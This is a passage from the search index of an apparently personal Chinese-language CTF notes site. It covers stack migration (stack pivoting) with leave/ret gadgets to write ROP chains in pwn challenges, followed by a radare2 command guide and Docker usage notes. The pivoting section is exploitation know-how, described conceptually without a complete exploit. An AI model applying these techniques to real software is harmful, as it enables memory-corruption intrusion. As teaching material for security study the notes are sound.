rbp\uff0c\u5982\u679c\u6c92\u6709\u8981\u57f7\u884c\u7b2c\u4e8c\u6b21\u7684 migration \u7684\u8a71\uff0c\u5c31\u96a8\u4fbf\u586b\u5c31\u597d\u4e86 buf2 + rop_chain + [set_input_parameters + input_func + leave_ret]","title":"Simple Migration"},{"location":"pwn/stack_migration/#_1","text":"leave\uff1a\u628a rbp \u8a2d\u5b9a\u6210 buf \u57f7\u884c input_func \u4e26\u5c07\u8f38\u5165\u8b80\u53d6\u5230 buf \u8f38\u5165\u65b0\u7684 rbp \u4ee5\u53ca ROP chain leave\uff1astack \u8df3\u8f49\u5230 buf \u4e26\u5c07 rbp \u8a2d\u6210 buf2 \u57f7\u884c ROP chain \u662f\u5426\u57f7\u884c\u4e0b\u4e00\u6b21 migration \u662f\uff1a\u8df3\u56de 2 ( buf \u548c buf2 \u5c0d\u8abf\uff0c\u591a\u6b21 migration \u5c31\u5728 buf \u548c buf2 \u4e92\u63db\u5373\u53ef) \u5426\uff1a\u7d50\u675f","title":"\u6d41\u7a0b"},{"location":"pwn/stack_migration/#fixed-size-migration","text":"\u5728\u4e0d\u80fd\u63a7\u5236\u8f38\u5165\u9577\u5ea6\u6642\uff0c\u5c31\u53ea\u80fd\u4f7f\u7528\u539f\u672c\u7684 read \u4f86\u591a\u6b21\u8f38\u5165 ROP chain \u5047\u8a2d\u6709\u4e00\u500b read \u8f38\u5165\u5f8c\u5982\u4e0b\uff0c\u53ea\u80fd\u5920\u8f38\u5165\u4e00\u500b Gadget payload (4*8 bytes) + rbp + ret \u9019\u6642\u5019\u5c31\u53ea\u80fd return \u5230\u539f\u672c\u7684 read (\u4ee5\u4e0b\u7a31 main_read ) \u4ed4\u7d30\u89c0\u5bdf\u4e00\u4e0b\u6703\u767c\u73fe main_read \u5176\u5be6\u6703\u5c07\u8f38\u5165\u5b58\u5230 rbp - 0x20 \uff0c\u53ef\u4ee5\u5229\u7528\u9019\u500b\u7279\u6027\u4f86\u5beb\u5165 ROP chain","title":"Fixed Size Migration"},{"location":"pwn/stack_migration/#migration","text":"\u7b2c\u4e00\u6b21\u53ea\u662f\u70ba\u4e86\u5c07 stack \u79fb\u52d5\u5230 buf \u4e0a\u800c\u5df2 payload (4*8 bytes) + buf1 + main_read leave\uff1a\u628a rbp \u8a2d\u5b9a\u6210 buf1 \u56de\u5230 main_read \u8b80\u53d6\u8f38\u5165\uff0c\u8b80\u53d6\u5230 buf1 - 0x20 leave\uff1a\u628a rsp \u8a2d\u5b9a\u6210 buf1 \uff0c rbp \u8a2d\u5b9a\u6210 buf1 \u4e0a\u5beb\u7684\u65b0 rbp","title":"\u7b2c\u4e00\u6b21 migration"},{"location":"pwn/stack_migration/#migration-rop-chain","text":"\u4e00\u958b\u59cb\u662f\u5148\u9001\u7b2c\u4e00\u6b21 migration \u7684\u8f38\u5165 payload (4*8 bytes) + buf2 + main_read \uff5c | rbp - 0x20 rbp \u524d\u9762 4*8 bytes \u5c31\u96a8\u4fbf\u653e\u5c31\u597d\u4e86\uff0c\u63a5\u8457\u5c07 rbp \u8a2d\u6210 buf2 \uff0c\u7136\u5f8c\u56de\u5230 main_read \u7b2c\u4e8c\u6b21\u57f7\u884c main_read \u6642\uff0c\u6703\u628a\u8f38\u5165\u5beb\u5230 buf2 - 0x20 \uff0c\u9019\u6642\u5f8c\u8f38\u5165\uff1a data (4*8 bytes) + buf1 + main_read \uff5c | buf2 - 0x20 rbp(buf2) \u9019\u6a23\u8f38\u5165\u4ee5\u5f8c\uff0c\u5c31\u53ef\u4ee5\u628a 4*8 bytes \u7684 ROP chain \u5beb\u5165 buf2 - 0x20 \uff0c\u7136\u5f8c\u518d\u8df3\u56de buf1 \u63a5\u8457\u5c31\u91cd\u8907\u57f7\u884c\u4ee5\u4e0a\u5169\u6b65\u5c31\u53ef\u4ee5\u4e86\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u6bcf\u6b21\u90fd\u662f\u7d66 buf2 \u6703\u4e00\u76f4\u8986\u84cb\u6389\uff0c\u6240\u4ee5\u8981\u4e00\u76f4\u66f4\u65b0\u4f4d\u7f6e +-------------+------+-------------+-------------+--------------+ | buf2 - 0x20 | buf2 | buf2 + 0x20 | buf2 + 0x40 | ... | +-------------+------+-------------+-------------+--------------+ | | | | 1st 2nd 3rd 4th","title":"\u4ea4\u66ff migration \u5beb\u5165 ROP chain"},{"location":"reverse/go/","text":"Reverse on go Reverse on go from Yi-Hsien Chen","title":"Go"},{"location":"reverse/go/#reverse-on-go","text":"Reverse on go from Yi-Hsien Chen","title":"Reverse on go"},{"location":"reverse/radare2/","text":"radare2 Radare2 \u662f\u4e00\u500b\u53ef\u4ee5\u5728 linux \u7528\u7684\u975c\u614b\u5206\u6790\u5de5\u5177 Links Github Radare2 book Install cd ~ git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh Start \u4f7f\u7528\u6642\u5c31\u76f4\u63a5\u6253 r2 binary \u5c31\u53ef\u4ee5\u9032\u5165 r2 \u7684\u4ecb\u9762\u4e86 r2 { binary } \u4e00\u958b\u59cb\u770b\u5230\u985e\u4f3c shell \u7684\u756b\u9762\u662f normal mode\uff0c\u53ef\u4ee5\u8f38\u5165 ? \u4f86\u770b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4 [XD] % r2 ./test.sym -- Use 'e' and 't' in Visual mode to edit configuration and track flags. [0x00400500]> ? Usage: [.][times][cmd][~grep][@[@iter]addr!size][|>pipe] ; ... Append '?' to any char command to get detailed help Prefix with number to repeat command N times (f.ex: 3x) |%var =valueAlias for 'env' command | *[?] off[=[0x]value] Pointer read/write data/values (see ?v, wx, wv) | (macro arg0 arg1) Manage scripting macros | .[?] [-|(m)|f|!sh|cmd] Define macro or load r2, cparse or rlang file | =[?] [cmd] Send/Listen for Remote Commands (rap://, http://, <fd>) | <[...] Push escaped string into the RCons.readChar buffer | /[?] Search for bytes, regexps, patterns, .. | ![?] [cmd] Run given command as in system(3) | #[?] !lang [..] Hashbang to run an rlang script | a[?] Analysis commands | b[?] Display or change the block size | c[?] [arg] Compare block with given data | C[?] Code metadata (comments, format, hints, ..) | d[?] Debugger commands | e[?] [a[=b]] List/get/set config evaluable vars | f[?] [name][sz][at] Add flag at current address | g[?] [arg] Generate shellcodes with r_egg | i[?] [file] Get info about opened file from r_bin ... \u4e5f\u53ef\u4ee5\u518d\u9032\u4e00\u6b65\u7528 ? \u770b\u67d0\u500b\u6307\u4ee4\u7684\u7528\u6cd5 [0x00400500]> p? |Usage: p[=68abcdDfiImrstuxz] [arg|len] [@addr] | p-[?][jh] [mode] bar|json|histogram blocks (mode: e?search.in) | p=[?][bep] [blks] [len] [blk] show entropy/printable chars/chars bars | p2 [len] 8x8 2bpp-tiles | p3 [file] print stereogram (3D) | p6[de] [len] base64 decode/encode | p8[?][j] [len] 8bit hexpair list of bytes | pa[edD] [arg] pa:assemble pa[dD]:disasm or pae: esil from hexpairs | pA[n_ops] show n_ops address and type | p[b|B|xb] [len] ([skip]) bindump N bits skipping M | pb[?] [n] bitstream of N bits | pB[?] [n] bitstream of N bytes ... Analyze aa \u5206\u6790 binary \u53ea\u6703\u770b global name aaa \u6df1\u5ea6\u5206\u6790 binary function \u5e95\u4e0b\u4f7f\u7528\u5230\u7684 functoin \u4e5f\u6703\u5206\u6790 afl \u5217\u51fa\u5206\u6790\u904e\u7684 function \u5fc5\u9808\u5148\u4f7f\u7528 aa \u6216\u662f aaa \u4ee5\u5f8c\uff0c\u7528 afl \u624d\u6703\u6709\u7d50\u679c afn \u66f4\u6539 function \u540d\u7a31 afn {new_function_name} {old_function_name} afvn \u66f4\u6539\u5340\u57df\u8b8a\u6578\u7684\u540d\u7a31 afvn {old_var_name} {new_var_name} Seek s \u79fb\u52d5\u5230\u67d0\u500b address \u6216 function s {address} s {function_name} Comment CC \u5728\u67d0\u8655\u589e\u52a0\u8a3b\u89e3 \u8a3b\u89e3\u4e2d\u4e0d\u80fd\u5305\u542b @\uff0c\u53ef\u4ee5\u7528 \\n \u4f86\u63db\u884c CC {comment} @ {address} CC- \u522a\u9664\u67d0\u8655\u7684\u8a3b\u89e3 CC- @ {address} Print pd \u5370\u51fa\u5f9e\u7576\u524d\u4f4d\u7f6e\u958b\u59cb\u7684 n \u884c\u6307\u4ee4 pd n # print n lines pd 3 # print 3 lines pdc \u5370\u51fa\u5f9e\u7576\u524d functoin \u7684 C-like pseudo code \u4e00\u5b9a\u8981\u5728 function \u7684\u958b\u982d\u624d\u80fd\u7528 pdc Project radare2 \u7684 project \u7ba1\u7406\uff0c\u53ef\u4ee5\u5728\u6a19\u8a18\u5b8c symbol \u4ee5\u5f8c\u5132\u5b58\u5728 project \uff0c\u4e0b\u6b21\u5c31\u76f4\u63a5\u958b\u555f\u540c\u4e00\u500b project \u5373\u53ef [0x00400618]> P? |Usage: P[?osi] [file]Project management | Pc [file] show project script to console | Pd [file] delete project | Pi [file] show project information | Pl list all projects | Pn[j] show project notes (Pnj for json) | Pn [base64] set notes text | Pn - edit notes with cfg.editor | Po [file] open project | Ps [file] save project | PS [file] save script file | P- [file] delete project (alias for Pd) | NOTE: See 'e??prj.' | NOTE: project are stored in ~/.config/radare2/projects Ps \u5132\u5b58\u7576\u524d\u5c08\u6848 \u6709\u5c08\u6848\u4ee5\u5f8c\uff0c\u5728\u95dc\u9589\u6642\u6703\u8a62\u554f\u662f\u5426\u5132\u5b58 Ps {project_name} Po \u958b\u555f\u67d0\u5c08\u6848 Po {project_name} PS \u5132\u5b58 script \u5c07\u7576\u524d\u6240\u6709\u7684\u64cd\u4f5c (\u4e3b\u8981\u662f symbol \u4e0a\u7684) \u5132\u5b58\u6210 script \u5728\u958b\u555f\u6642\u7528 r2 -i {script} {binary} \u5c31\u628a symbol \u90fd\u6a19\u56de\u4f86\u4e86\uff0c\u4e0d\u904e\u6703\u6253\u4e0d\u958b Visual Mode (\u539f\u56e0\u4e0d\u660e) PS {script_name} Quit q \u9000\u51fa r2 \uff0c\u6216\u8005\u662f\u9000\u51fa\u67d0\u500b\u6a21\u5f0f q Visual Mode visual mode \u53ef\u4ee5\u770b\u5230 binary \u7684\u5716\u5f62 \u9032\u5165 \u6253\u4e00\u6b21 V \u53ef\u4ee5\u770b\u5230 binary \u7684 hexdump\uff0c\u518d\u8f38\u5165\u4e00\u6b21 V \u53ef\u4ee5\u770b\u5230\u5716\u5f62 V \u9000\u51fa \u9000\u5230\u4e0a\u4e00\u5c64 q \u5716\u5f62\u6a21\u5f0f\u683c\u5f0f\u5207\u63db \u53ef\u4ee5\u5207\u63db\u770b\u4e0d\u540c\u7684\u986f\u793a\u6a21\u5f0f p \u8f38\u5165 normal mode \u6307\u4ee4 \u5148\u6253 : \u4ee5\u5f8c\u53ef\u4ee5\u770b\u5230\u4e00\u500b\u985e\u4f3c normal mode shell \u7684\u4ecb\u9762\uff0c\u8f38\u5165\u5b8c\u6307\u4ee4\u591a\u6309\u4e00\u6b21 enter \u5c31\u53ef\u4ee5\u9000\u56de Visual Mode : # \u9032\u5165 normal mode shell <enter> # \u9000\u56de Visual Mode define function \u8f38\u5165 df \u5c31\u6703\u81ea\u52d5\u5b9a\u7fa9 function \u4e86 patch \u5148\u7528 s \u79fb\u52d5\u5230\u8981 patch \u7684\u4f4d\u7f6e\uff0c\u63a5\u8457\u8f38\u5165 A \u53ef\u4ee5\u770b\u5230\u7576\u524d\u7684\u6307\u4ee4 \u6b64\u6642\u9375\u5165\u8981\u6539\u7684\u7d44\u5408\u8a9e\u8a00\u5373\u53ef \u958b\u555f\u6642\u8981\u7528 r2 -w {file} \u624d\u80fd\u5beb\u5165 Evaluable vars \u4e00\u4e9b\u74b0\u5883\u8a2d\u5b9a \u958b\u555f jump table \u5206\u6790 switch \u7684\u6642\u5019\uff0c\u958b\u555f jump table \u53ef\u4ee5\u9023 switch options \u7684\u5167\u5bb9\u90fd\u5206\u6790 \u958b\u555f\u4ee5\u5f8c\uff0c\u5982\u679c\u5207\u63db\u5230 Visual Mode \u6703\u770b\u5230\u5f9e libc_start_main \u958b\u59cb\u7684\u6574\u5f35\u5716\uff0c\u8981\u8dd1\u5f88\u4e45 (\u539f\u56e0\u4e0d\u660e) e anal.jmptbl = true Notes r2 analyzes stripped binary","title":"radare2"},{"location":"reverse/radare2/#radare2","text":"Radare2 \u662f\u4e00\u500b\u53ef\u4ee5\u5728 linux \u7528\u7684\u975c\u614b\u5206\u6790\u5de5\u5177","title":"radare2"},{"location":"reverse/radare2/#links","text":"Github Radare2 book","title":"Links"},{"location":"reverse/radare2/#install","text":"cd ~ git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh","title":"Install"},{"location":"reverse/radare2/#start","text":"\u4f7f\u7528\u6642\u5c31\u76f4\u63a5\u6253 r2 binary \u5c31\u53ef\u4ee5\u9032\u5165 r2 \u7684\u4ecb\u9762\u4e86 r2 { binary } \u4e00\u958b\u59cb\u770b\u5230\u985e\u4f3c shell \u7684\u756b\u9762\u662f normal mode\uff0c\u53ef\u4ee5\u8f38\u5165 ? \u4f86\u770b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4 [XD] % r2 ./test.sym -- Use 'e' and 't' in Visual mode to edit configuration and track flags. [0x00400500]> ? Usage: [.][times][cmd][~grep][@[@iter]addr!size][|>pipe] ; ... Append '?' to any char command to get detailed help Prefix with number to repeat command N times (f.ex: 3x) |%var =valueAlias for 'env' command | *[?] off[=[0x]value] Pointer read/write data/values (see ?v, wx, wv) | (macro arg0 arg1) Manage scripting macros | .[?] [-|(m)|f|!sh|cmd] Define macro or load r2, cparse or rlang file | =[?] [cmd] Send/Listen for Remote Commands (rap://, http://, <fd>) | <[...] Push escaped string into the RCons.readChar buffer | /[?] Search for bytes, regexps, patterns, .. | ![?] [cmd] Run given command as in system(3) | #[?] !lang [..] Hashbang to run an rlang script | a[?] Analysis commands | b[?] Display or change the block size | c[?] [arg] Compare block with given data | C[?] Code metadata (comments, format, hints, ..) | d[?] Debugger commands | e[?] [a[=b]] List/get/set config evaluable vars | f[?] [name][sz][at] Add flag at current address | g[?] [arg] Generate shellcodes with r_egg | i[?] [file] Get info about opened file from r_bin ... \u4e5f\u53ef\u4ee5\u518d\u9032\u4e00\u6b65\u7528 ? \u770b\u67d0\u500b\u6307\u4ee4\u7684\u7528\u6cd5 [0x00400500]> p? |Usage: p[=68abcdDfiImrstuxz] [arg|len] [@addr] | p-[?][jh] [mode] bar|json|histogram blocks (mode: e?search.in) | p=[?][bep] [blks] [len] [blk] show entropy/printable chars/chars bars | p2 [len] 8x8 2bpp-tiles | p3 [file] print stereogram (3D) | p6[de] [len] base64 decode/encode | p8[?][j] [len] 8bit hexpair list of bytes | pa[edD] [arg] pa:assemble pa[dD]:disasm or pae: esil from hexpairs | pA[n_ops] show n_ops address and type | p[b|B|xb] [len] ([skip]) bindump N bits skipping M | pb[?] [n] bitstream of N bits | pB[?] [n] bitstream of N bytes ...","title":"Start"},{"location":"reverse/radare2/#analyze","text":"","title":"Analyze"},{"location":"reverse/radare2/#aa","text":"\u5206\u6790 binary \u53ea\u6703\u770b global name","title":"aa"},{"location":"reverse/radare2/#aaa","text":"\u6df1\u5ea6\u5206\u6790 binary function \u5e95\u4e0b\u4f7f\u7528\u5230\u7684 functoin \u4e5f\u6703\u5206\u6790","title":"aaa"},{"location":"reverse/radare2/#afl","text":"\u5217\u51fa\u5206\u6790\u904e\u7684 function \u5fc5\u9808\u5148\u4f7f\u7528 aa \u6216\u662f aaa \u4ee5\u5f8c\uff0c\u7528 afl \u624d\u6703\u6709\u7d50\u679c","title":"afl"},{"location":"reverse/radare2/#afn","text":"\u66f4\u6539 function \u540d\u7a31 afn {new_function_name} {old_function_name}","title":"afn"},{"location":"reverse/radare2/#afvn","text":"\u66f4\u6539\u5340\u57df\u8b8a\u6578\u7684\u540d\u7a31 afvn {old_var_name} {new_var_name}","title":"afvn"},{"location":"reverse/radare2/#seek","text":"","title":"Seek"},{"location":"reverse/radare2/#s","text":"\u79fb\u52d5\u5230\u67d0\u500b address \u6216 function s {address} s {function_name}","title":"s"},{"location":"reverse/radare2/#comment","text":"","title":"Comment"},{"location":"reverse/radare2/#cc","text":"\u5728\u67d0\u8655\u589e\u52a0\u8a3b\u89e3 \u8a3b\u89e3\u4e2d\u4e0d\u80fd\u5305\u542b @\uff0c\u53ef\u4ee5\u7528 \\n \u4f86\u63db\u884c CC {comment} @ {address}","title":"CC"},{"location":"reverse/radare2/#cc-","text":"\u522a\u9664\u67d0\u8655\u7684\u8a3b\u89e3 CC- @ {address}","title":"CC-"},{"location":"reverse/radare2/#print","text":"","title":"Print"},{"location":"reverse/radare2/#pd","text":"\u5370\u51fa\u5f9e\u7576\u524d\u4f4d\u7f6e\u958b\u59cb\u7684 n \u884c\u6307\u4ee4 pd n # print n lines pd 3 # print 3 lines","title":"pd"},{"location":"reverse/radare2/#pdc","text":"\u5370\u51fa\u5f9e\u7576\u524d functoin \u7684 C-like pseudo code \u4e00\u5b9a\u8981\u5728 function \u7684\u958b\u982d\u624d\u80fd\u7528 pdc","title":"pdc"},{"location":"reverse/radare2/#project","text":"radare2 \u7684 project \u7ba1\u7406\uff0c\u53ef\u4ee5\u5728\u6a19\u8a18\u5b8c symbol \u4ee5\u5f8c\u5132\u5b58\u5728 project \uff0c\u4e0b\u6b21\u5c31\u76f4\u63a5\u958b\u555f\u540c\u4e00\u500b project \u5373\u53ef [0x00400618]> P? |Usage: P[?osi] [file]Project management | Pc [file] show project script to console | Pd [file] delete project | Pi [file] show project information | Pl list all projects | Pn[j] show project notes (Pnj for json) | Pn [base64] set notes text | Pn - edit notes with cfg.editor | Po [file] open project | Ps [file] save project | PS [file] save script file | P- [file] delete project (alias for Pd) | NOTE: See 'e??prj.' | NOTE: project are stored in ~/.config/radare2/projects","title":"Project"},{"location":"reverse/radare2/#ps","text":"\u5132\u5b58\u7576\u524d\u5c08\u6848 \u6709\u5c08\u6848\u4ee5\u5f8c\uff0c\u5728\u95dc\u9589\u6642\u6703\u8a62\u554f\u662f\u5426\u5132\u5b58 Ps {project_name}","title":"Ps"},{"location":"reverse/radare2/#po","text":"\u958b\u555f\u67d0\u5c08\u6848 Po {project_name}","title":"Po"},{"location":"reverse/radare2/#ps_1","text":"\u5132\u5b58 script \u5c07\u7576\u524d\u6240\u6709\u7684\u64cd\u4f5c (\u4e3b\u8981\u662f symbol \u4e0a\u7684) \u5132\u5b58\u6210 script \u5728\u958b\u555f\u6642\u7528 r2 -i {script} {binary} \u5c31\u628a symbol \u90fd\u6a19\u56de\u4f86\u4e86\uff0c\u4e0d\u904e\u6703\u6253\u4e0d\u958b Visual Mode (\u539f\u56e0\u4e0d\u660e) PS {script_name}","title":"PS"},{"location":"reverse/radare2/#quit","text":"","title":"Quit"},{"location":"reverse/radare2/#q","text":"\u9000\u51fa r2 \uff0c\u6216\u8005\u662f\u9000\u51fa\u67d0\u500b\u6a21\u5f0f q","title":"q"},{"location":"reverse/radare2/#visual-mode","text":"visual mode \u53ef\u4ee5\u770b\u5230 binary \u7684\u5716\u5f62","title":"Visual Mode"},{"location":"reverse/radare2/#_1","text":"\u6253\u4e00\u6b21 V \u53ef\u4ee5\u770b\u5230 binary \u7684 hexdump\uff0c\u518d\u8f38\u5165\u4e00\u6b21 V \u53ef\u4ee5\u770b\u5230\u5716\u5f62 V","title":"\u9032\u5165"},{"location":"reverse/radare2/#_2","text":"\u9000\u5230\u4e0a\u4e00\u5c64 q","title":"\u9000\u51fa"},{"location":"reverse/radare2/#_3","text":"\u53ef\u4ee5\u5207\u63db\u770b\u4e0d\u540c\u7684\u986f\u793a\u6a21\u5f0f p","title":"\u5716\u5f62\u6a21\u5f0f\u683c\u5f0f\u5207\u63db"},{"location":"reverse/radare2/#normal-mode","text":"\u5148\u6253 : \u4ee5\u5f8c\u53ef\u4ee5\u770b\u5230\u4e00\u500b\u985e\u4f3c normal mode shell \u7684\u4ecb\u9762\uff0c\u8f38\u5165\u5b8c\u6307\u4ee4\u591a\u6309\u4e00\u6b21 enter \u5c31\u53ef\u4ee5\u9000\u56de Visual Mode : # \u9032\u5165 normal mode shell <enter> # \u9000\u56de Visual Mode","title":"\u8f38\u5165 normal mode \u6307\u4ee4"},{"location":"reverse/radare2/#define-function","text":"\u8f38\u5165 df \u5c31\u6703\u81ea\u52d5\u5b9a\u7fa9 function \u4e86","title":"define function"},{"location":"reverse/radare2/#patch","text":"\u5148\u7528 s \u79fb\u52d5\u5230\u8981 patch \u7684\u4f4d\u7f6e\uff0c\u63a5\u8457\u8f38\u5165 A \u53ef\u4ee5\u770b\u5230\u7576\u524d\u7684\u6307\u4ee4 \u6b64\u6642\u9375\u5165\u8981\u6539\u7684\u7d44\u5408\u8a9e\u8a00\u5373\u53ef \u958b\u555f\u6642\u8981\u7528 r2 -w {file} \u624d\u80fd\u5beb\u5165","title":"patch"},{"location":"reverse/radare2/#evaluable-vars","text":"\u4e00\u4e9b\u74b0\u5883\u8a2d\u5b9a","title":"Evaluable vars"},{"location":"reverse/radare2/#jump-table","text":"\u5206\u6790 switch \u7684\u6642\u5019\uff0c\u958b\u555f jump table \u53ef\u4ee5\u9023 switch options \u7684\u5167\u5bb9\u90fd\u5206\u6790 \u958b\u555f\u4ee5\u5f8c\uff0c\u5982\u679c\u5207\u63db\u5230 Visual Mode \u6703\u770b\u5230\u5f9e libc_start_main \u958b\u59cb\u7684\u6574\u5f35\u5716\uff0c\u8981\u8dd1\u5f88\u4e45 (\u539f\u56e0\u4e0d\u660e) e anal.jmptbl = true","title":"\u958b\u555f jump table"},{"location":"reverse/radare2/#notes","text":"r2 analyzes stripped binary","title":"Notes"},{"location":"tools/docker/","text":"Docker Dockerfile FROM ubuntu MAINTAINER frozenkp WORKDIR /root RUN apt-get update build docker build -t \"name:tag\" . tag docker tag \"name:tag\" \"name:tag\" push docker push name:tag Standard run docker run -it { --name pwn_env } { -v /??/data:/root/data } { -p \"host:container\" } { --privileged } image_name /bin/bash --name : container name -v : volume -p : port --privileged : ptrace privilege exec docker exec -it container_name /bin/bash cp # from container to host docker cp container_name:src_path dest_path # from host to container docker cp stc_path container_name:src_path start docker start container_name stop docker stop container_name","title":"Docker"},{"location":"tools/docker/#docker","text":"","title":"Docker"},{"location":"tools/docker/#dockerfile","text":"FROM ubuntu MAINTAINER frozenkp WORKDIR /root RUN apt-get update","title":"Dockerfile"},{"location":"tools/docker/#build","text":"docker build -t \"name:tag\" .","title":"build"},{"location":"tools/docker/#tag","text":"docker tag \"name:tag\" \"name:tag\"","title":"tag"},{"location":"tools/docker/#push","text":"docker push name:tag","title":"push"},{"location":"tools/docker/#standard","text":"","title":"Standard"},{"location":"tools/docker/#run","text":"docker run -it { --name pwn_env } { -v /??/data:/root/data } { -p \"host:container\" } { --privileged } image_name /bin/bash --name : container name -v : volume -p : port --privileged : ptrace privilege","title":"run"},{"location":"tools/docker/#exec","text":"docker exec -it container_name /bin/bash","title":"exec"},{"location":"tools/docker/#cp","text":"# from container to host docker cp container_name:src_path dest_path # from host to container docker cp stc_path container_name:src_path","title":"cp"},{"location":"tools/docker/#start","text":"docker start container_name","title":"start"},{"location":"tools/docker/#stop","text":"docker stop container_name","title":"stop"}]}